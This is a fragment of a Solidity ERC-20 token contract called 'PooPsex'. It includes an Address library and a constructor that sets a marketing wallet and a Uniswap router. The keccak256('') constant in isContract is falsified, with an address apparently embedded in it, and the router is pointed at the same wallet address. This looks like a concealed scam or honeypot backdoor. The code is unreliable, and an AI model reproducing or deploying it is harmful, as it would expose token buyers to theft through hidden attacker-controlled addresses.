...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0xcF6C4d79f6F1795783a6DF9F7D71002f2070CCe2ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xcF6C4d79f6F1795783a6DF9F7D71002f2070CCe2ca82273b7bfad8045d85a470;
...
contract PooPsex is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "PooPsex";
    string private _symbol = "psex";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xAB44D977339d26dcfE8ba0A757D1da117a73Dde4);
    ...
    constructor () {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xAB44D977339d26dcfE8ba0A757D1da117a73Dde4);
